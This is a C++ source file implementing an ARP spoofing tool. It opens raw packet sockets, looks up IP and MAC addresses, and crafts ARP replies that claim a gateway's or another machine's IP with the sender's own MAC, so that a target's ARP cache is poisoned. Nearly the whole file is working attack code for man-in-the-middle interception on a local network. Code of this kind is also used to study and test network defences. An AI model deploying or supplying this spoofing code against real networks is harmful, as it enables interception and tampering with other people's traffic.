#include "arp_socket.hpp"
#include "endpoint.hpp"
#include <cstring>
#include <format>
#include <net/if.h> // Must be declared before linux/if_arp.h
#include <linux/if_arp.h>
#include <netinet/in.h>
#include <stdexcept>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

namespace {
    /* Helper
     */
    inline void wait(std::int64_t nanoInterval)
    {
        struct timespec waitInterval = {.tv_sec = 0, .tv_nsec = nanoInterval};
        ::nanosleep(&waitInterval, nullptr);
    }
} // namespace

spoof::Ip4Addr spoof::locate_ip4_addr(const std::string& interface,
                                      const std::string& ip4)
{
    constexpr std::int64_t kNanoWaitInterval = 500000000;

    // Create temp socket
    int sfd = endpoint_udp();
    if (sfd == -1) {
        throw std::runtime_error(std::format("Error: {}", ::strerror(errno)));
    }

    // Discover address
    if (endpoint_connect(sfd, ip4.c_str(), 8888) == -1) {
        std::string message = std::format("Error: {}", ::strerror(errno));
        endpoint_close(sfd);
        throw std::runtime_error(message);
    }

    if (char buf[6] = {static_cast<char>(0xff)};
        endpoint_write(sfd, buf, 6) == -1) {
        std::string message = std::format("Error: {}", ::strerror(errno));
        endpoint_close(sfd);
        throw std::runtime_error(message);
    }

    // Sleep for the requisite time
    wait(kNanoWaitInterval);

    // Get ARP data
    struct in_addr ipAddr = {};
    if (::inet_pton(AF_INET, ip4.c_str(), &ipAddr) == 0) {
        endpoint_close(sfd);
        throw std::runtime_error("Invalid IPv4 address");
    }

    struct arpreq request = {};
    if (interface.size() > sizeof(request.arp_dev) - 1) {
        endpoint_close(sfd);
        throw std::runtime_error("Invalid interface");
    }

    auto* saddr = reinterpret_cast<struct sockaddr_in*>(&request.arp_pa);
    saddr->sin_addr = ipAddr;
    saddr->sin_family = AF_INET;

    std::format_to_n(
        request.arp_dev, sizeof(request.arp_dev) - 1, "{}", interface);

    if (::ioctl(sfd, SIOCGARP, reinterpret_cast<caddr_t>(&request)) == -1) {
        std::string message = std::format("Error: {}", ::strerror(errno));
        endpoint_close(sfd);
        throw std::runtime_error(message);
    }

    endpoint_close(sfd);

    const char* const mac = request.arp_ha.sa_data;

    if (ip4.size() > Ip4Addr::kBuffSize) {
        std::string message = std::format("Error: {}", ::strerror(errno));
        endpoint_close(sfd);
        throw std::runtime_error(message);
    }

    return {.ip4 = ip4, .mac = std::string(mac, mac + 6)};
}

namespace {
    /* Helper */
    inline bool locate_my_mac_addr_impl(const int sfd,
                                        const std::string& interface,
                                        struct ifreq& ifr)
    {
        std::memset(&ifr, 0, sizeof(ifreq));

        std::format_to_n(
            ifr.ifr_name, sizeof(ifr.ifr_name) - 1, "{}", interface);

        // use ioctl to look up interface name and get its mac address.
        return ::ioctl(sfd, SIOCGIFHWADDR, &ifr) != -1;
    }

    /* Helper */
    inline bool locate_my_ip4_addr_impl(const int sfd,
                                        const std::string& interface,
                                        struct ifreq& ifr)
    {
        std::memset(&ifr, 0, sizeof(ifreq));
        std::format_to_n(
            ifr.ifr_name, sizeof(ifr.ifr_name) - 1, "{}", interface);

        // use ioctl to look up interface name and get its mac address.
        return ::ioctl(sfd, SIOCGIFADDR, &ifr) != -1;
    }
} // namespace

/* Helper */
spoof::Ip4Addr spoof::locate_my_ip4_addr(const std::string& interface)
{
    // Create temp socket for resolving interface
    int sfd = ::socket(AF_INET, SOCK_STREAM, 0);
    if (sfd == -1) {
        throw std::runtime_error("Error creating socket");
    }

    // Get my interface-related data structures
    ifreq ifreqIP = {};
    ifreq ifrHW = {};

    if (!locate_my_ip4_addr_impl(sfd, interface, ifreqIP)) {
        endpoint_close(sfd);
        throw std::runtime_error("Couldn't locate our IP address");
    }

    if (!locate_my_mac_addr_impl(sfd, interface, ifrHW)) {
        endpoint_close(sfd);
        throw std::runtime_error("Couldn't locate our MAC address");
    }

    // Cleanup
    endpoint_close(sfd);

    // Create arp socket interface
    const char* saddr = ::inet_ntoa(
        reinterpret_cast<struct sockaddr_in*>(&ifreqIP.ifr_addr)->sin_addr);

    return {.ip4 = saddr,
            .mac = std::string(ifrHW.ifr_hwaddr.sa_data,
                               ifrHW.ifr_hwaddr.sa_data + 6)};
}

namespace {
    // Builds header
    inline void eth_hdr_hdr_broadcast(char* frame, const char* const srcMac)
    {
        // Destination MAC address: broadcast address
        std::memset(&frame[0], 0xff, 6);
        // Source MAC addresses
        std::memcpy(&frame[6], srcMac, 6);

        // Next is ethernet type code (ETH_P_ARP for ARP)
        // http://www.iana.org/assignments/ethernet-numbers
        frame[12] = ETH_P_ARP / 256;
        frame[13] = ETH_P_ARP % 256;
    }

    // Builds header
    inline void eth_hdr_hdr(char* frame,
                            const char* const tgtMac,
                            const char* const srcMac)
    {
        // Destination MAC address
        std::memcpy(&frame[0], tgtMac, 6);
        // Source MAC addresses
        std::memcpy(&frame[6], srcMac, 6);

        // Next is ethernet type code (ETH_P_ARP for ARP)
        // http://www.iana.org/assignments/ethernet-numbers
        frame[12] = ETH_P_ARP / 256;
        frame[13] = ETH_P_ARP % 256;
    }

    // Builds header
    inline void arp_hdr_hdr(char* frame)
    {
        // Hardware type (16 bits): 1 for ethernet
        std::uint16_t htype = ::htons(1);
        std::memcpy(&frame[0], &htype, sizeof(std::uint16_t));

        // Protocol type (16 bits): 2048 for IP
        std::uint16_t ptype = ::htons(ETH_P_IP);
        std::memcpy(&frame[2], &ptype, sizeof(std::uint16_t));

        // Hardware address length (8 bits): 6 bytes for MAC address
        frame[4] = 0x6;

        // Protocol address length (8 bits): 4 bytes for IPv4 address
        frame[5] = 0x4;
    }

    // Opcode
    inline void arp_hdr_opc(char* frame, const std::uint16_t value)
    {
        std::uint16_t v = ::htons(value);
        std::memcpy(&frame[6], &v, sizeof(std::uint16_t));
    }

    // Sender hardware address
    inline void arp_hdr_sha(char* frame, const char* const value)
    {
        std::memcpy(&frame[8], value, 6);
    }

    // Sender protocol address
    inline void arp_hdr_spa(char* frame, const char* const value)
    {
        ::inet_pton(AF_INET, value, &frame[14]);
    }

    // Target hardware address
    inline void arp_hdr_tha(char* frame, const char* const value)
    {
        std::memcpy(&frame[18], value, 6);
    }

    // Target protocol address
    inline void arp_hdr_tpa(char* frame, const char* const value)
    {
        ::inet_pton(AF_INET, value, &frame[24]);
    }
} // namespace

std::unique_ptr<spoof::ArpSocket> spoof::ArpSocket::create_broadcast(
    const std::string& interface)
{
    Ip4Addr srcAddr = locate_my_ip4_addr(interface);
    return std::make_unique<ArpSocket>(interface, srcAddr);
}

std::unique_ptr<spoof::ArpSocket> spoof::ArpSocket::create_spoofed_gateway(
    const std::string& interface,
    const Ip4Addr& tgtAddr,
    const std::string& gatewayAddr)
{
    if (gatewayAddr.size() > Ip4Addr::kBuffSize) {
        return nullptr;
    }

    Ip4Addr myFakeAddr = locate_my_ip4_addr(interface);
    myFakeAddr.ip4 = gatewayAddr;

    return std::make_unique<ArpSocket>(interface, myFakeAddr, tgtAddr);
}

std::unique_ptr<spoof::ArpSocket> spoof::ArpSocket::create_spoofed_machine(
    const std::string& interface,
    const Ip4Addr& tgtAddr,
    const std::string& machineAddr)
{
    if (machineAddr.size() > Ip4Addr::kBuffSize) {
        return nullptr;
    }

    Ip4Addr myFakeAddr = locate_my_ip4_addr(interface);
    myFakeAddr.ip4 = machineAddr;

    return std::make_unique<ArpSocket>(interface, myFakeAddr, tgtAddr);
}

spoof::ArpSocket::~ArpSocket()
{
    close();
}

spoof::ArpSocket::ArpSocket(const std::string& interface,
                            const Ip4Addr& srcAddr)
{
    if (srcAddr.mac.size() < 6) {
        throw std::runtime_error("Error: Invalid MAC address");
    }

    // Create socket
    sfd_ = socket(PF_PACKET, SOCK_RAW, ::htons(ETH_P_ALL));
    if (sfd_ == -1) {
        throw std::runtime_error(
            std::format("Error creating raw socket: {}", ::strerror(errno)));
    }

    // Create sockaddr_ll struct
    std::memset(&device_, 0, sizeof(sockaddr_ll));
    std::memcpy(&device_.sll_addr[0], srcAddr.mac.c_str(), 6);

    device_.sll_ifindex = static_cast<int>(::if_nametoindex(interface.c_str()));
    if (device_.sll_ifindex == 0) {
        std::string message
            = std::format("Error creating raw socket: {}", ::strerror(errno));
        close();
        throw std::runtime_error(message);
    }

    device_.sll_halen = 6;
    device_.sll_family = AF_PACKET;

    char* eth = header_;
    char* arp = header_ + kEthlen;

    // Zero out header
    std::memset(header_, 0, kHeaderLen);

    // Fill out ethernet header
    eth_hdr_hdr_broadcast(eth, srcAddr.mac.c_str());
    // Fill out arp header
    arp_hdr_hdr(arp);
    // Fill out src hardware address
    arp_hdr_sha(arp, srcAddr.mac.c_str());
    // Fill out src protocol address
    arp_hdr_spa(arp, srcAddr.ip4.c_str());
}

spoof::ArpSocket::ArpSocket(const std::string& interface,
                            const Ip4Addr& srcAddr,
                            const Ip4Addr& tgtAddr)
{
    if (srcAddr.mac.size() < 6) {
        throw std::runtime_error("Error: Invalid MAC address");
    }

    if (tgtAddr.mac.size() < 6) {
        throw std::runtime_error("Error: Invalid MAC address");
    }

    // Create socket
    sfd_ = socket(PF_PACKET, SOCK_RAW, ::htons(ETH_P_ALL));
    if (sfd_ == -1) {
        throw std::runtime_error(
            std::format("Error creating raw socket: {}", ::strerror(errno)));
    }

    // Create sockaddr_ll struct
    std::memset(&device_, 0, sizeof(sockaddr_ll));
    std::memcpy(&device_.sll_addr[0], srcAddr.mac.c_str(), 6);

    device_.sll_ifindex = static_cast<int>(::if_nametoindex(interface.c_str()));
    if (device_.sll_ifindex == 0) {
        std::string message
            = std::format("Error creating raw socket: {}", ::strerror(errno));
        close();
        throw std::runtime_error(message);
    }

    device_.sll_halen = 6;
    device_.sll_family = AF_PACKET;

    char* eth = header_;
    char* arp = header_ + kEthlen;

    // Zero out header
    std::memset(header_, 0, kHeaderLen);

    // Fill out ethernet header.
    eth_hdr_hdr(eth, tgtAddr.mac.c_str(), srcAddr.mac.c_str());
    // Fill out arp header
    arp_hdr_hdr(arp);
    // Fill out src hardware address
    arp_hdr_sha(arp, srcAddr.mac.c_str());
    // Fill out src protocol address
    arp_hdr_spa(arp, srcAddr.ip4.c_str());
    // Fill out tgt hardware address
    arp_hdr_tha(arp, tgtAddr.mac.c_str());
    // Fill out tgt protocol address
    arp_hdr_tpa(arp, tgtAddr.ip4.c_str());
}

void spoof::ArpSocket::close()
{
    if (sfd_ != -1) {
        endpoint_close(sfd_);
        sfd_ = -1;
    }
}

bool spoof::ArpSocket::send_reply() const
{
    return send_impl(ARPOP_REPLY);
}

bool spoof::ArpSocket::send_request() const
{
    return send_impl(ARPOP_REQUEST);
}

bool spoof::ArpSocket::send_impl(int opcode) const
{
    const auto* device = reinterpret_cast<const struct sockaddr*>(&device_);

    // Generate outgoing frame
    char frame[kHeaderLen] = {};
    std::memcpy(&frame[0], header_, kHeaderLen);

    // OpCode: 1 for ARP request
    arp_hdr_opc(&frame[kEthlen], static_cast<::uint16_t>(opcode));

    // Send frame
    ssize_t nbytes
        = ::sendto(sfd_, frame, sizeof(frame), 0, device, sizeof(sockaddr_ll));
    return nbytes != -1;
}
